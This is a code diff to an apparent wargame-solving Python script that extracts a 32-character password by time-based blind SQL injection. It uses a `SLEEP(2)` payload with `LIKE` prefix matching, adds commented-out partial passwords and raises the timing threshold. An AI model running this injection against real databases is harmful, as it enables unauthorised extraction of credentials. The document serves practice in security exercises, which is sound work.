@@ -32,6 +32,8 @@ def obtain_password_chars(session, url, auth):
 def retrieve_password(session, url, auth, password_chars_file):
     """ tests the order of each character from obtain_password_chars(...)
     and determines the actual password """
+    # password = '8NEDUUxg8kFgPV84uxJ'
+    # password = '8NEDUUxg8kFgPV84uLwvqnw'
     password = ''
     while len(password) < 32:
         password_chars = utils.read_file(password_chars_file)
@@ -39,7 +41,7 @@ def retrieve_password(session, url, auth, password_chars_file):
             print(char, end=' ')
             payload = f'{NEXT_LEVEL}" AND IF(BINARY password LIKE "{password + char}%", SLEEP(2), False) #'
             elapsed_time = determine_request_time(session, url, auth, payload)
-            if elapsed_time > 1:
+            if elapsed_time > 2:
                 password += char
                 print(f"Current password: {password}")
                 break
